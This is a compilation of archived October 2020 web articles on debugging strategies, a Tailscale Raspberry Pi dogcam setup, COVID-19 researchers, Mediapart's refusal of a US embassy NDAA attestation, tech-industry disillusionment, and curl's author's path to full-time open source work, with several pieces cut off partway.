<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/standard_strategy-1024x719.png" alt="standard debugging strategy" width="1024" height="719" srcset="https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-1024x719.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-300x211.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-768x539.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-1536x1078.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy.png 1764w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>This is how we usually do things: We try changing the thing we think is the most likely cause of the issue in our code. If that works, great! We solved the problem. If it doesn’t work, we try changing the thing we think is the <em>next</em> most likely item causing the issue in our code, and so on.</p>
<p>I call this strategy the <em>standard strategy</em><strong>. </strong>This is often the quickest way to diagnose the bug, assuming we understand the code’s behavior. We can move fast when we wish to push forward with new functionality or large refactors. This is <a href="https://www.functionize.com/blog/6-ways-to-improve-your-debugging-skills/">the mode demonstrated in most programming tutorials</a>, and it’s the one celebrated by product owners and hiring managers.</p>
<p>It has a problem, though: The less we understand the behavior of our code, the lower the correlation between the things we <em>think</em> are causing the bug and the thing that’s really causing the bug, and the weaker this strategy becomes. So we get end up in vicious cycles:</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/standard_strategy_failure-1024x701.png" alt="standard strategy failure" width="1024" height="701" srcset="https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-1024x701.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-300x205.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-768x526.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-1536x1051.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure.png 1780w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>Have you ever gotten so frustrated while searching for an issue in your code that you tried something you <em>know</em> you already tried, just to see if it works this time? <em>That</em> is the point where a different strategy might work better.</p>
<h3>Learning to investigate</h3>
<p>Choosing a different strategy means first shifting our mindset. So far we have been in <em>progress mode</em>, trying to change the software with speed. We need a second mode: <em>investigation mode</em><strong>.</strong></p>
<p>In investigation mode, we are no longer focused on pushing changes. Instead, we focus on narrowing down the problem space by testing our assumptions. “Success,” in investigation mode, is not an incrementally broader feature set. Instead, it is an incrementally tighter feedback loop in which we experiment with the thing we don’t understand in order to gain an understanding.</p>
<p>The gold standard here is often a failing test that replicates a problem. Any tactic with a tight feedback loop works, though—the tighter the better.</p>
<p>We are reluctant to shift into investigation mode because, unlike progress mode, it doesn’t <em>feel</em> fast. Nevertheless, when we deal with unknowns, a precise investigation can help resolve issues in less time (and with much less effort) than the brute-force approach of progress mode.</p>
<p>For example, I ran into a problem with image upload on an application that processes NASA LandSat data. Upload happened at the very end of the processing pipeline, which took about 20 minutes to run. So even though I had a pretty good guess at the cause of the problem, testing my theory would take at least 20 minutes. Instead, I wrote a little script to rerun the exact portion of the code that failed and made sure I could reproduce the issue. Voila! That script allowed me to rerun the failing code in a matter of seconds. So when it turned out that my guess about the problem was wrong, I could check a lot more possibilities much faster than if I had to run the whole pipeline each time. You can follow me step-by-step through that exact bug <a href="https://chelseatroy.com/2020/01/27/the-case-of-the-failing-upload-part-1/" target="_blank" rel="noopener noreferrer">right over here</a>.</p>
<p>What kind of strategies might help us narrow down where a bug is happening?</p>
<h3>We could use a binary search to find the problem</h3>
<p>In this strategy, we assume that the code path follows a single-threaded, linear flow from the beginning of execution (where we run the code) to the end of execution, or when the issue happens.</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/binary_search_strategy-1024x433.png" alt="binary search strategy" width="1024" height="433" srcset="https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-1024x433.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-300x127.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-768x324.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-1536x649.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-2048x865.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>We choose a spot more or less in the <em>middle </em>of that flow. Then we print, log, or breakpoint to test our assumptions about the pieces of code that would contribute to the issue. If something looks off, we move <em>backward</em>, choose another point halfway between that starting point and the beginning of execution, and test our assumptions again.</p>
<p>By contrast, if everything looks good, we move <em>forward, </em>choose a point halfway between the starting point and the end of execution ( or when the issue happens), and test our assumptions there instead.</p>
<p>Each time we jump, we reduce the size of the potential problem space by half. Even in enormous code bases with long threads of execution, we can isolate the location of an issue in just a few hops with a binary search.</p>
<p>There are cases where binary search won’t work: namely, cases where the code path does not follow a single-threaded, linear flow from the beginning of execution to the end.</p>
<h3>Instead, we may need to systematically trace the code path</h3>
<p>This approach is simpler to communicate than the binary search strategy. It follows the logical line of inquiry and results in fewer misinterpretations. Depending on the length and complexity of the process you’re debugging, this strategy might take longer than the binary search strategy, but sometimes it works better for multi-threaded or asynchronous processes that are hard to map onto a linear flow for using binary search.</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/beginning_to_end-1024x409.png" alt="beginning to end" width="1024" height="409" srcset="https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-1024x409.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-300x120.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-768x307.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-1536x614.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-2048x819.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>In this strategy, we begin right where the code begins executing. Test the assumptions there, at the starting point. If everything looks good, we take the next step forward towards the end of the process (or the spot where the issue happens), and test our assumptions again. Even if we <em>think</em> that the problem occurs toward the end, we do not skip to that spot. Instead, we systematically move through the steps of the process from the beginning, making sure that the state of our system matches our expectations at every point.</p>
<p>Remember: if we’re struggling to resolve an issue, there’s probably something we don’t understand about what’s going on. At least one of&nbsp; our assumptions doesn’t match up with reality. This systematic approach helps us find out where that is.</p>
<p>To help us differentiate our assumptions from system behavior, it can be helpful to explicitly list our assumptions and checks. As we follow the process, at each point where we stop, we can write down a list of three things:</p>
<ol>
<li><strong>Givens</strong>: Stuff that we assume to be true at this point</li>
<li><strong>Checks:</strong> Things that we are checking with print statements, logging, break points, etc.</li>
<li><strong>Results:</strong> What we saw when we tested out each of our checks. Did it match expectations?</li>
</ol>
<p>This practice of recording our steps during a debugging session has little to do with remembering what we did (though it does help with that). Rather, we are training our brains to spot our own assumptions.</p>
<p>You’ll know it’s working if your “given” lists start getting longer. We <em>especially</em> remember to include givens that weren’t what we thought when we hunted down previous bugs. We build this intuition when we get better at debugging through practice. That teaches us to recognize our assumptions, which we previously mistook to be plain old truths. That’s how we get stuck. And to get <em>unstuck</em>, we need to find the inaccuracies that are hiding in our only <em>partially</em> correct understanding of how the code works.</p>
<p>There’s another advantage to identifying common patterns in our wrong assumptions (at least the ones that cause bugs). Doing so lets us improve our <em>language-agnostic</em> debugging intuition. That’s right: the skill of&nbsp; recognizing our own assumptions helps us debug more effectively even if we switch tech stacks.</p>
<h3>What about issues that only appear sometimes?</h3>
<p>Among the most frustrating bugs are those that crop up erratically. These types of problems have a special talent for eluding programmers—sometimes for days, sometimes for years! They usually happen for one of two reasons:</p>
<ul>
<li><strong>Defining the process too narrowly. </strong>Our idea of where our code begins and ends, and everything in between, is <em>missing </em>some variable. Maybe it’s an environment variable. Maybe it’s a race condition. Maybe it’s an edge case that we haven’t yet identified. To find it, we have to broaden our scope. What are we placing <em>outside</em> the set of things we’re looking at that actually belongs <em>inside</em> it?</li>
<li><strong>One of the givens is only true sometimes. </strong>This kind of bug tries developer and tester patience more than any other kind. They’re difficult to track down because, even when we <em>check</em> our givens, those givens might turn out to be accurate…<em>this time</em>. We have to check them multiple times, and hope that <em>each time</em> we re-check it, it does the thing it might only do sometimes.</li>
</ul>
<h3>When to switch modes</h3>
<p>Most developers and testers are excellent at working in progress mode, where we focus on pushing changes to a software system at a quick pace. But that happens when we understand exactly what the system is doing. Hard-to-find bugs, by definition, represent something we <em>don’t</em> understand. At that point, it’s time to switch strategies. Focus on investigation — to narrow down the things that <em>could</em> cause the problem.</p>
<p>Both investigation strategies need us to recognize and test our assumptions. What do we <em>think</em> is true at this point? How <em>sure</em> are we? Can we use a print statement, a breakpoint, a logging statement, or another means to test our assumption? We can even keep a written record of our assumptions, checks, and results as we debug to help ourselves get better at our cross-platform debugging skills. Tools can help with the bookkeeping, but it’s the human skill that finds the “oh that’s why!” source of the problem.</p>
<p>Debugging can sometimes feel tedious and frustrating, but a few …</p></div></div>

October 26, 2020 | https://tailscale.com/kb/1076/dogcam | <a href="https://web.archive.org/web/*/https://tailscale.com/kb/1076/dogcam">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Tailscale makes it easy to setup a dogcam that you can securely access from
anywhere.</p>
<p>Unlike an off-the-shelf dogcam, with Tailscale you don’t need to trust
a third-party service, or risk exposing a camera inside your home to the public
internet. Every connection on Tailscale is encrypted and entirely private
to your network.</p>
<h4 id="prerequisites">Prerequisites</h4>
<p>Before you begin this guide, you’ll need two things:</p>
<ol>
<li>A Raspberry Pi with Wi-Fi/Ethernet capabilities (e.g. <a href="https://www.raspberrypi.org/products/">Raspberry Pi 3 B+</a>)</li>
<li>A USB webcam (e.g. <a href="https://www.amazon.com/dp/B0058LKJIO/">Logitech C615</a>)</li>
</ol>
<p>This guide assumes your Raspberry Pi is already <a href="https://www.raspberrypi.org/documentation/configuration/wireless/wireless-cli.md">set up with an internet connection</a>,
whether Wi-Fi or Ethernet.</p>
<p>You’ll also need <a href="https://tailscale.com/start">a Tailscale account</a>. You can make
a free solo account using a @gmail.com address.</p>
<h4 id="step-1-install-tailscale-on-your-raspberry-pi">Step 1: Install Tailscale on your Raspberry Pi</h4>
<p>You can find instructions at the link below.</p>

<p>Once it is installed, and you’ve run <code>tailscale up</code> on your Raspberry Pi, continue to the next step.</p>
<h4 id="step-2-install-motion">Step 2: Install motion</h4>
<p>Next, install <a href="https://motion-project.github.io/">motion</a> using apt with this command</p>
<pre><code>sudo apt install motion</code></pre>


<h4 id="step-3-configure-motion">Step 3: Configure motion</h4>
<p>First, we’ll enable motion to run as a background service. Edit
<code>/etc/default/motion</code> using <code>nano</code> or your favourite editor:</p>
<pre><code>sudo nano /etc/default/motion</code></pre>


<p>We’ll change the start_motion_daemon setting to “yes”:</p>
<pre><code>start_motion_daemon=yes</code></pre>


<p>Save and close the file.</p>
<p>Next, we’ll configure motion to expose a web page, and modify a few video
capture settings too.</p>
<p>Open up <code>/etc/motion/motion.conf</code> with your editor</p>
<pre><code>sudo nano /etc/motion/motion.conf</code></pre>


<p>Search for the following settings, updating their values to ones listed below.</p>
<p><em>Enable viewing video streams over the web.</em> You can also change the port from the default value (8081) if you’d like.</p>
<pre><code>stream_port 8081
stream_localhost off</code></pre>


<p><em>Disable saving images or video to the SD card.</em> Since this is a dogcam, we
  only care about looking at live footage.</p>
<pre><code>output_pictures off
ffmpeg_output_movies off</code></pre>


<p>Save and close the file.</p>
<h4 id="step-4-restart-motion">Step 4: Restart motion</h4>
<p>Once all your configuration settings have been updated, restart motion</p>
<pre><code>sudo service motion restart</code></pre>


<h4 id="step-5-view-your-dogcam">Step 5: View your dogcam</h4>
<p>From any device in your Tailscale network, you can now view the live webcam
stream from <code>&lt;raspberry pi tailscale ip&gt;:8081</code>. <a href="https://tailscale.com/kb/1033/ip-and-dns-addresses">Find your Raspberry Pi’s IP</a>
and type it into your browser.</p>
<figure>
  <img src="https://tailscale.com/files/images/docs/guides/dogcam-raspberry-pi.jpg">
  <figcaption>
    <p>
    On macOS, you can click on the device name to copy the IP address.
    </p>
</figcaption></figure>

<p>You should see a feed from your webcam, that will look something like this.</p>
<figure>
  <img src="https://tailscale.com/files/images/docs/guides/dogcam-browser.jpg">
  <figcaption>
    <p>
    Theo and Casey are looking at something that's totally not a Tailscale employee running around in a backyard.
    </p>
</figcaption></figure>

<p>Success! You now have a functioning dogcam, secured with Tailscale. This can
only be accessed by devices on your personal Tailscale network, and no one else.</p>
<div>
<p>Note</p>
<p>Your browser may show an “insecure” warning, since your connection isn’t
over HTTPS. Tailscale secures your connection at a lower level, so rest easy
knowing you are securely connected to any website at 100.x.y.z IP address.</p>
</div>
<h4 id="next-steps">Next steps</h4>
<p>Install Tailscale onto your <a href="https://tailscale.com/download/android">Android</a> or <a href="https://tailscale.com/download/ios">iOS</a>
device to check in on your dogs (or other pets) wherever you may be.</p>
<p>You may also want experiment with other settings such as <code>width</code>, <code>height</code>,
or <code>framerate</code>. If you make other changes, be sure to restart motion
with <code>sudo service motion restart</code> afterwards.</p>

<p>The COVID-19 pandemic has been a world-changing event, forcing all of us to spend a lot of time thinking about change. More than ever, we’re inquiring about how diseases evolve, how new treatments and procedures are developed and adopted, and how up-and-coming experts are bringing new ideas and new ways of thinking to the medical landscape. We know that 2020 has brought a lot of new changes and concepts to the forefront of life. Words like quarantine and social distancing are part of our everyday lexicon as we learn to live in the ‘new normal.’ And one of the most important lessons we have learned is that there are heroes among us. From teachers and nurses to delivery and retail workers, our citizens have stepped up to support the effort.</p>



<p>Given that it’s <a href="https://idweek.org/" target="_blank" rel="noreferrer noopener">ID Week</a>, we’d like to highlight and honor a few of these heroes that surprisingly few know about – the scientists who are leading the charge against <a rel="noreferrer noopener" href="https://www.medifind.com/conditions/covid-19/6278" target="_blank">COVID-19</a>.</p>

The antibody against Hendra and Nipah viruses has been evaluated in humans and approved for clinical use on a compassionate basis in Australia.</p>



<p>Recently Dr. Dimitrov’s lab isolated the smallest biological molecule to date that completely and specifically neutralizes the SARS-CoV-2 virus, which is the cause of COVID-19.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><span>In an email sent to our “Subscribers” department on September 24th, the United States embassy in France notified us that its subscription to Mediapart would only be renewed on condition that Mediapart signs a declaration certifying that we do not use equipment manufactured by Chinese companies or their subsidiaries.</span></p>
<p><span>The notification, written in French, polite in form and firm in substance, read as follows: “We subscribe to Mediapart (2 subscriptions), I am sending you, attached here, an attestation in English [<i>see </i><a href="https://static.mediapart.fr/files/2020/10/07/po-ndaa-representations-sept-2020-1.pdf" target="_blank"><i>here</i></a>] which should be signed and dated. Without this attestation, we will no longer be able to buy from you [<i>sic</i>] because the government of the United States requires an attestation by those who sell to us certifying that they do not use certain materials, the list of which is below.” </span></p>
<p><span>“The government of the United States of America voted the entering into force of the <a href="https://content.govdelivery.com/accounts/ORDOT/bulletins/29b2007" target="_blank">National Defense Authorization Act (NDAA)</a> on August 13th 2020; a part of the NDAA is specifically dedicated to contracts and acquisitions, and notably to commercial relations with companies which use within their network(s) material from <a href="https://fr.wikipedia.org/wiki/Huawei" target="_blank">Huawei</a>, <a href="https://fr.wikipedia.org/wiki/ZTE" target="_blank">ZTE</a>, <a href="https://fr.wikipedia.org/wiki/Hikvision" target="_blank">Hikvision</a>, <a href="https://en.wikipedia.org/wiki/Dahua_Technology" target="_blank">Dahua</a>,<a href="https://en.wikipedia.org/wiki/Hytera" target="_blank">Hytera</a> as well as their subsidiaries and affiliated companies. Therefore, we thank you for returning the attestation, duly signed, in order to be able to provide you with an order form for your services.” </span></p>
<p><span>The five companies targeted are large Chinese groups working in the fields of telecommunications and telemonitoring and controlled by the authorities in Beijing. Far from being zealous, the American diplomatic services in France are simply applying the instructions of the Trump administration which unilaterally imposes its trade law in the name of security interests. It was thus that its decision to pull out of the deal over the Iranian nuclear programme was accompanied by threats of sanctions against any European company that continued to do business with Tehran. Far from being anecdotal, these measures, which are those of a dominating nationalism, signify the death of any multilateralism, the American power believing itself to have the right to impose, without discussion, its laws upon foreign partners, without regard for their sovereignty, liberty or rights.</span></p>
<p><span>That is what is illustrated, to the point of absurdity, by the bureaucratic order that has been made to us for just two subscriptions. We could have regarded it as laughable, and signed and return the attestation required of us, considering it to be a simple formality. But this is about a question of principle, where essential issues of renunciation are at play. So here below is the reply I sent to the US embassy services concerned, in my position as publishing editor of Mediapart, on October 6th, explaining our refusal to comply with the demand.&nbsp; &nbsp;</span></p>
<p><b><span>*</span></b></p>
<p><span>In your email correspondence of September 24th 2020, you asked Mediapart, in the name of the National Defense Authorization Act (NDAA) of August 13th 2020, to certify that it does not use telecommunications equipment or services supplied by the companies Huawei, ZTE, Hikvision, Dahua and Hyteria, and does not use equipment, systems or services using equipment or services provided by these companies. In the event that we do not provide that certification, you indicate that you will no longer be able to maintain your subscriptions to our journal in the name of the United States embassy.</span></p>
<p><span>Your request, if we agreed to it, would require Mediapart to apply discrimination of its suppliers on the basis of their country of origin, in this case companies established in the People’s Republic of China, namely Huawei, ZTE, Hikvision, Dahua and Hyteria. This in every sense represents placing pressure on an independent media.</span></p>
<p><span>Your administration cannot be unaware that any pressure placed on a media organisation is an attack on its independence. This concerns a principle which is enshrined in the First Amendment of the Constitution of the United States, the country where the freedom of expression and that of the press was born. This principle was in turn enshrined in the Constitution of the French Republic, in the European Charter of Fundamental Rights and in the European Convention on Human Rights, which are the laws which govern us.&nbsp;&nbsp;&nbsp; </span></p>
<p><span>Mediapart chooses its suppliers on the basis of criteria concerning quality and price. To give a favourable response to a request of this nature, one that is obviously discriminatory, would undermine the managerial choices of Mediapart and its economic equilibrium.&nbsp; </span></p>
<p><span>Concerning the material supplied by the targeted companies, the requirements of the government of the United States of America refer to security criteria, but are evidently of an ideological nature. Given that the activities of our journal do not concern, in any manner, the national security or foreign affairs policies of the United States of America, your request is unreasonable.</span></p>
<p><span>In the same way that we would not accept in any manner an instruction from the People’s Republic of China aimed at prohibiting us, on the pretext of security, from using the products, services, platforms or equipment of American companies (Microsoft, Apple, Google, Facebook, Twitter, Instagram, etc.), your request relating to products of Chinese companies (Huawei, ZTE, Hikvision, Dahua and Hyteria) cannot in any manner be given satisfaction.</span></p>
<p><span>Finally, concerning the links between the government of the People’s Republic of China and the companies targeted by your request, we remind you that Mediapart is a journal at the forefront of the defence of human and political rights, notably those of the inhabitants of Hong Kong and of Tibet, and members of the Uyghur minority, and therefore has no need of a lecture on these engagements from any state or government.</span></p>
<p><span>Yours sincerely.</span></p>

October 26, 2020 | https://www.spakhm.com/p/surviving-disillusionment | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/surviving-disillusionment">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past few weeks I wrote about <a href="https://www.spakhm.com/p/how-to-get-promoted">corporate politics</a>, <a href="https://www.spakhm.com/p/parallel-tracks">distribution of power</a>, and <a href="https://www.spakhm.com/p/an-open-letter-to-my-friends-with">disregard for ethics</a>. Dozens of people reached out to say the posts were dark, cynical and depressingly accurate. There are more dark posts I can write— about lies in venture capital, the devastating price of failure, the destructive aspect of creative relationships, the ubiquity of envy. But I think I've gotten my point across. The industry can be depressing. I now want to concentrate on a different question: what to do with this knowledge.</p><p>The word "possession" means owning things, but it also means things owning you. Knowledge can possess people. Once you observe the darker side of human nature in the technology industry, you cannot forget or unsee it. The subsequent cynicism can be so disheartening that the romance of the computer revolution is beat out of people completely.</p><p>I've met many engineers with extraordinary talent who decided to stop making software. They wanted to program computers all their lives. They were born for it. After spending six, eight, ten years in the industry, they quit for good. Now they're running breweries and hydroponic farms, with no desire to ever again touch a compiler, let alone get back into the fray.</p><p>There is nothing wrong with brewing beer or growing hydroponic tomatoes. What's sad is that people weren't pulled into their new occupation by better financial opportunities or conviction; instead they were pushed away from technology. If brewing paid as much as programming, it still wouldn't have been their first choice. Something had to have gone wrong for them to abandon their first love.</p><p>In <a href="https://amzn.to/35ATS95">Zen Mind, Beginner's Mind</a>, Shunryu Suzuki says:</p><blockquote><p>For us, the monastic life was the usual life, and the people who came from the city were unusual people. When we saw them we felt, “Oh, some unusual people have come!” But once I had left Eiheiji and been away for some time, coming back was different. I heard the various sounds of practice—the bells and the monks reciting the sutra—and I had a deep feeling. There were tears flowing out of my eyes, nose, and mouth! It is the people who are outside of the monastery who feel its atmosphere. Those who are practicing actually do not feel anything. I think this is true for everything.</p></blockquote><p>I still remember the feeling when I first glanced inside the monastery. My parents bought me a ZX Spectrum computer connected to an old Soviet TV and cassette player, a few bootleg games, and a Z80 assembly manual printed on a dot matrix printer that was out of ink; about one tenth of the text was unreadable. I spent countless hours playing games, learning BASIC and Z80 assembly, and deciphering the missing parts of the manual. I don't remember much else from that time. That little machine was a window into a different world— limitless, safe, and totally engaging. At the time, nothing else mattered.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:206242,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>My next computer was an IBM machine with an i386 processor, 2MB of RAM (the ZX Spectrum had 16KB), a 30MB hard disk, and a five inch floppy drive. I could load programs in seconds instead of minutes. I could run Dune 2 and Wolfenstein 3D and hex editors and Prince of Persia and MS DOS and Borland Turbo Pascal and Civilization and a C compiler and Windows 3.1. I could save stuff! I remember studying Win16 APIs and feeling like I made contact with an advanced alien civilization. As I type this now, I still have sense memory of that machine. The rubbery smell, the buzzing sound of the CRT monitor, the springy feel of the keyboard (with proper arrow keys and all sorts of extra buttons!)</p><p>Then my friend's parents bought him an i486 machine with 4MB of RAM. It could run Doom. Everything changed again. You didn't even need to play to know that computer history was just delineated into before and after. As soon as you saw the artwork of the game menu, you knew. Doom changed me in a profound way. I used to never think about computers or programming. It was just something I loved to do more than anything else. But a few seconds of Doom gameplay permanently flipped a bit in my brain. It made me aware that programming computers is what I want to be doing for the rest of my life.</p><p>After that came the internet, and with it a whirlwind of new worlds. Some were brand new. Others were old, but the internet gave me the opportunity to access them for the first time. Windows 95, newsgroups, geocities, ICQ, Visual Studio, Diablo, Starcraft, 3Dfx Voodoo Banshee, Gamedev.net, IRC, Slashdot, DirectX, Windows NT, Java, OpenGL, NewEgg, Winamp, Napster, Deus Ex, World of Warcraft, Linux, Emacs, GPL, Google, Common Lisp, Standard ML, Smalltalk, the iPhone, Oculus Rift. Each had its own unique atmosphere. Each was a window into a different universe. Each one felt limitless. Safe. Engaging.</p><p>Everything, from the first ZX Spectrum to Oculus Rift was punctuated by countless books of science fiction. My dad introduced me to the genre with Jules Verne's The Mysterious Island, in which a team of five end up on an uninhabited island, and use their knowledge and ingenuity to rebuild a technological civilization from scratch. I remember reading this novel over and over, completely enthralled. I tried some of the experiments, with intermittent success.</p><p>My parents had a few shelves stacked with books, and I spent countless nights losing myself in them. I read everything by Jules Verne I could get my hands on, including From the Earth to the Moon, Twenty Thousand Leagues Under the Sea, Around the World in Eighty Days, and Journey to the Center of the Earth. After Verne I moved on to Ray Bradbury (The Veldt), Arkadiy and Boris Strugatsky (Prisoners of Power), Stanislaw Lem (the fantastical Summa Technologiae). I also read every story we had by Jack London— I couldn't imagine anything more exciting than the combination of science fiction and the romance of the American frontier. Today, nearly thirty years later, I still can't.</p><p>After we moved to America I learned that there is an enormous universe of science fiction that I missed as a child. I started filling the gaps and read stories and novels by Isaac Asimov, Arthur Clarke, William Gibson, Neal Stephenson, Ian Banks, Philip Dick, Cory Doctorow, Charlie Stross, Dan Simmons, Jack Vance, and Vernor Vinge. I also continued reading Russian science fiction. I read everything by Strugatsky brothers, and binge-read the pulpy Russian spin on the cyberpunk genre by Sergei Lukyanenko.</p><p>As I grew older I shifted to reading about megaprojects and the intersection of technology and commerce. I read about railroads, electrification, aviation, radio, television, silicon, and the stories of Bell Labs, Microsoft, The Manhattan Project, and The Apollo program. How the heck did we invent all this stuff, wire the planet, speed up transportation by two orders of magnitude, go to space, put a computer on every desk, and then, as if it weren't enough, put a supercomputer in every pocket?! How did we do all <em>that</em>?!</p><p>Sometimes I imagine what would happen if I could send my ten year old self a letter and tell him I could press a button and read <a href="https://amzn.to/2TrADJK">Masters of Doom</a> the next day, instantly send a short message to John Carmack from <em>anywhere</em> using an always connected supercomputer in my pocket, or that I worked for a company that published <a href="https://amzn.to/2HsSXQm">The Making of Prince of Persia</a>. He would have been over the moon!</p><p>But sitting at a mandated retrospective or mindlessly gluing APIs together doesn't put me over the moon. It makes me feel the opposite (whatever the opposite of being over the moon is). And so, engineers are faced with two realities. One reality is the atmosphere of new technology, its incredible power to transform the human condition, the joy of the art of doing science and engineering, the trials of the creative process, the romance of the frontier. The other reality is the frustration and drudgery of operating in a world of corporate politics, bureaucracy, envy and greed— a world <em>so</em> depressing, that many people quit in frustration, never to come back.</p><p>If you work in technology, the monastery can be distant and vague, whereas Paul from marketing wants to circle back with you here and now. Then, as you circle back again and again, the monastery recedes further into the distance, and the drudgery appears closer and closer, until it occupies your entire field of vision and you can't see anything else.</p><p>I have friends in the medical field, and they vent about drudgery and endless bureaucracy <em>all the time</em>. They have more roadblocks than we do, and theirs are objectively worse than ours. The hours are longer, the bureaucracy is more entrenched, the regulators mandate their time be wasted on bullshit, and mistakes can have devastating consequences. Yet I haven't heard of a single doctor who quit his practice and moved to Colorado to run a ski lodge. When I ask why, they all give the same response: the patients. Every day they see patients brought back to health, the bullshit recedes into the background, and they're reminded why they got into medicine.</p><p>The default in engineering is different. We don't have a daily ritual built into our jobs that reminds us why we got into the field. Without a ritual, the drudgery creeps closer and the vision of the monastery recedes. So we must be very deliberate in developing rituals to keep the two realities in their proper proportion.</p><p>I think the reason many engineers have trouble with this is that so much of our field is about knowledge, but rituals aren't about knowledge at all— they're about practice. You must develop a daily mantra, a spell, a routine, whatever you want to call it, and then perform it religiously. I needed a lot of trial and error to get it right, and I’m still playing with the details. The internet desensitized me to text and video. Anything that happens in front of a screen doesn't help with perspective anymore. But I discovered that getting away from the screen and handling physical items does.</p><p>I don't know what will work for you, but here are a few ideas. Read used hard cover …</p></div></div>

<p>I work full time on open source and this is how.</p>



<h2>Background</h2>



<p>I started learning how to program in my teens, well over thirty years ago and I’ve worked as a software engineer and developer since the early 1990s. My first employment as a developer was in 1993. I’ve since worked for and with lots of companies and I’ve worked on a huge amount of (proprietary) software products and devices over many years. Meaning: I certainly didn’t start my life open source. I had to earn it.</p>



<p>When I was 20 years old I did my (then mandatory) military service in Sweden. After having endured that, I applied to the university while at the same time I was offered a job at IBM. I hesitated, but took the job. I figured I could always go to university later – but life took other turns and I never did. I didn’t do a single day of university. I haven’t regretted it.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/10/commodore64.jpg" alt="" width="229" height="119"></figure></div>



<p>I learned to code in the mid 80s on a Commodore 64 and software development has been one of my primary hobbies ever since. One thing it taught me well, that I still carry with me, is to spend a few hours per day in front of my home computer.</p>



<h2>And then I shipped curl</h2>



<p>In the spring of 1998 I renamed my little pet project of the time again and I released the first ever <a href="https://curl.haxx.se/">curl</a> release. I have told this story many times, but since then I have spent two hours or so of my spare time on that project – <em>every day for over twenty years</em>. While still working as a software engineer by day.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="214" height="187" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 214px) 100vw, 214px"></figure></div>



<p>Over time, curl gradually grew popular and attracted more users. There was no sudden moment in time where I struck gold and everything took off. It was just slowly gaining ground while me and my fellow project members kept improving and polishing curl. At some point in time I happened to notice that curl and libcurl would appear in more and more acknowledgements and in open source license collections in products and devices.</p>



<p>It was still just a spare time project.</p>



<h2>Proprietary Software for years</h2>



<p>I’d like to emphasize that I worked as a contract and consultant developer for many years (over 20!), primarily on proprietary software and custom solutions, before I managed to land myself a position where I could primarily write open source as part of my job.</p>



<h2>Mozilla</h2>



<p>In 2014 I <a href="https://daniel.haxx.se/blog/2014/01/13/this-is-my-first-day-at-mozilla/" data-type="post" data-id="5377">joined Mozilla</a> and got the opportunity to work on the open source project Firefox for a living – and doing it entirely from my home. This was the first time in my career I actually spent most of my days on code that was made public and available to the world. They even allowed me to spend a part of my work hours on curl, even if that didn’t really help them and curl was not a fundamental part of any Mozilla work or products. It was still great.</p>



